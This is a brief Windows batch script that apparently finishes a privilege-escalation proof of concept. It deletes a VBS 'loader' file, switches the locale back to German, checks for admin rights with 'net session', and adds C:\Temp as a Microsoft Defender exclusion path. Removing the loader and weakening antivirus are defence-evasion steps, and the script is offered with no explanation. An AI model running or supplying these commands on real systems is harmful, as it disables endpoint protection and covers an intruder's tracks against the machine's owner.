@rem delete loader
del fb05c66d-c6c1-4347-9330-d9a3c0bca994.tmp.vbs

@rem play success sound and switch locale back to german
Powershell (New-Object System.Media.SoundPlayer "$env:windir\Media\tada.wav").PlaySync(); Set-WinUserLanguageList -LanguageList de-DE -force

timeout 4
start cmd /c "net session & echo success & pause"
Powershell Add-MpPreference -ExclusionPath "C:\Temp"